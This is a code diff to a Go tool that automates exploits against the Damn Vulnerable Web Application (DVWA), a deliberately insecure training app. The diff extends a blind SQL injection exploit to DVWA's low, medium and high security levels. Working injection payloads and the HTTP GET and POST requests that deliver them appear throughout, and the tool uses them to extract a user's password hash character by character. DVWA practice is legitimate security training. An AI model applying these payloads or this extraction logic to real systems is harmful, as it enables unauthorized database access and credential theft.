@@ -26,11 +26,12 @@ var (
 var (
 	cli = kingpin.New("dvwa", "Automated exploits for the Damn Vulnerable Web Application (DVWA).")
 
-	sqliBlind        = cli.Command("sqli-blind", "Run the SQL injection (blind) exploit.")
-	sqliBlindAddr    = sqliBlind.Flag("addr", "Address of the DVWA server.").Required().String()
-	sqliBlindMode    = sqliBlind.Flag("mode", "Search mode to use.").Default("concurrent").Enum("concurrent", "binary")
-	sqliBlindWorkers = sqliBlind.Flag("workers", "Number of workers to use for concurrent search mode.").Default("10").Int()
-	sqliBlindUserID  = sqliBlind.Arg("user-id", "User ID to target. Must be between 1-5.").Required().Enum("1", "2", "3", "4", "5")
+	sqliBlind         = cli.Command("sqli-blind", "Run the blind SQL injection exploit to crack a user's password hash.")
+	sqliBlindAddr     = sqliBlind.Flag("addr", "Address of the DVWA server.").Required().String()
+	sqliBlindMode     = sqliBlind.Flag("mode", "Search mode to use for cracking the password hash.").Default("concurrent").Enum("concurrent", "binary")
+	sqliBlindSecurity = sqliBlind.Flag("security", "Security level of the vulnerability to target. Must be one of [low, medium, high].").Default("low").Enum("low", "medium", "high")
+	sqliBlindWorkers  = sqliBlind.Flag("workers", "Number of workers to use for concurrent search mode.").Default("10").Int()
+	sqliBlindUserID   = sqliBlind.Arg("user-id", "User ID to target. Must be between 1-5.").Required().Enum("1", "2", "3", "4", "5")
 )
 
 func init() {
@@ -46,7 +47,7 @@ func main() {
 }
 
 func sqliBlindRun() error {
-	guesser, err := NewBlindSQLGuesser(*sqliBlindAddr, *sqliBlindUserID)
+	guesser, err := NewBlindSQLGuesser(*sqliBlindAddr, *sqliBlindSecurity, *sqliBlindUserID)
 	if err != nil {
 		return err
 	}
@@ -54,7 +55,10 @@ func sqliBlindRun() error {
 	injector := NewInjector(guesser, *sqliBlindWorkers)
 
 	start := time.Now()
-	injector.Exploit(*sqliBlindMode)
+	err = injector.Exploit(*sqliBlindMode)
+	if err != nil {
+		cli.FatalIfError(err, "sqli-blind")
+	}
 	duration := time.Since(start)
 
 	fmt.Printf("Password of user with ID %s: %s [%d guesses in %v]\n", *sqliBlindUserID, string(injector.password), injector.guesses, duration)
@@ -112,6 +116,12 @@ func (i *BlindSQLInjector) Exploit(mode string) error {
 		i.wg.Wait()
 		close(attempts)
 
+		for pos, value := range i.password {
+			if value == 0 {
+				return fmt.Errorf("no possible value for password at position %d", pos)
+			}
+		}
+
 	case "binary":
 		for pos := range i.password {
 			answer, err := i.exploitBinary(charset, pos)
@@ -152,6 +162,10 @@ func (i *BlindSQLInjector) exploitBinary(possible []byte, position int) (byte, e
 	i.guesses++
 	mid := len(possible) / 2
 
+	if len(possible) == 0 {
+		return 0, fmt.Errorf("no possible value for password at position %d", position)
+	}
+
 	equal, err := i.guesser.GuessEqual(position, possible[mid])
 	if err != nil {
 		return 0, err
@@ -178,21 +192,23 @@ type Guesser interface {
 }
 
 type BlindSQLGuesser struct {
-	client *http.Client
-	addr   string
-	userID string
+	client   *http.Client
+	addr     string
+	security string
+	userID   string
 }
 
-func NewBlindSQLGuesser(addr string, userID string) (*BlindSQLGuesser, error) {
+func NewBlindSQLGuesser(addr, security, userID string) (*BlindSQLGuesser, error) {
 	jar, err := cookiejar.New(nil)
 	if err != nil {
 		return nil, err
 	}
 
 	guesser := &BlindSQLGuesser{
-		client: &http.Client{Jar: jar},
-		addr:   addr,
-		userID: userID,
+		client:   &http.Client{Jar: jar},
+		addr:     addr,
+		security: security,
+		userID:   userID,
 	}
 
 	if err := guesser.Login(); err != nil {
@@ -240,44 +256,62 @@ func (g *BlindSQLGuesser) Login() error {
 		return fmt.Errorf("failed to login with status code %d", resp.StatusCode)
 	}
 
+	index, err := url.Parse(fmt.Sprintf("http://%s/index.php", g.addr))
+	if err != nil {
+		return err
+	}
+
+	cookies := append(g.client.Jar.Cookies(index), &http.Cookie{Name: "security", Value: g.security})
+	g.client.Jar.SetCookies(index, cookies)
+
 	return nil
 }
 
 func (g *BlindSQLGuesser) GuessEqual(position int, char byte) (bool, error) {
-	query := fmt.Sprintf("7' OR (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE user_id = %s), %d, 1))) = %d#", g.userID, position+1, char)
-	resp, err := g.client.Get(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/?id=%s&Submit=Submit#", g.addr, url.QueryEscape(query)))
-	if err != nil {
-		return false, err
-	}
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return false, err
-	}
-	defer resp.Body.Close()
-
-	matches := resultRe.FindSubmatch(body)
-	if len(matches) < 2 {
-		fmt.Println(string(body))
-		return false, fmt.Errorf("could not get exploit result")
-	}
-	result := string(matches[1])
-
-	switch result {
-	case "User ID exists in the database.":
-		return true, nil
-	case "User ID is MISSING from the database.":
-		return false, nil
-	default:
-		return false, fmt.Errorf("unexpected exploit result: %s", result)
-	}
+	return g.guess(position, char, "=")
 }
 
 func (g *BlindSQLGuesser) GuessGreater(position int, char byte) (bool, error) {
-	query := fmt.Sprintf("7' OR (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE user_id = %s), %d, 1))) > %d#", g.userID, position+1, char)
-	resp, err := g.client.Get(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/?id=%s&Submit=Submit#", g.addr, url.QueryEscape(query)))
-	if err != nil {
-		return false, err
+	return g.guess(position, char, ">")
+}
+
+func (g *BlindSQLGuesser) guess(position int, char byte, op string) (bool, error) {
+	var resp *http.Response
+	var err error
+	switch g.security {
+	case "low":
+		query := fmt.Sprintf("7' OR (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE user_id = %s), %d, 1))) %s %d#", g.userID, position+1, op, char)
+		resp, err = g.client.Get(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/?id=%s&Submit=Submit#", g.addr, url.QueryEscape(query)))
+		if err != nil {
+			return false, err
+		}
+	case "medium":
+		query := fmt.Sprintf("7 OR (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE user_id = %s), %d, 1))) %s %d#", g.userID, position+1, op, char)
+		data := url.Values{
+			"id":     {query},
+			"Submit": {"Submit"},
+		}
+
+		resp, err = g.client.PostForm(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/", g.addr), data)
+		if err != nil {
+			return false, err
+		}
+	case "high":
+		query := fmt.Sprintf("7' OR (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE user_id = %s), %d, 1))) %s %d#", g.userID, position+1, op, char)
+		data := url.Values{
+			"id":     {query},
+			"Submit": {"Submit"},
+		}
+
+		resp, err = g.client.PostForm(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/cookie-input.php", g.addr), data)
+		if err != nil {
+			return false, err
+		}
+
+		resp, err = g.client.Get(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/", g.addr))
+		if err != nil {
+			return false, err
+		}
 	}
 
 	body, err := ioutil.ReadAll(resp.Body)
@@ -288,7 +322,6 @@ func (g *BlindSQLGuesser) GuessGreater(position int, char byte) (bool, error) {
 
 	matches := resultRe.FindSubmatch(body)
 	if len(matches) < 2 {
-		fmt.Println(string(body))
 		return false, fmt.Errorf("could not get exploit result")
 	}
 	result := string(matches[1])
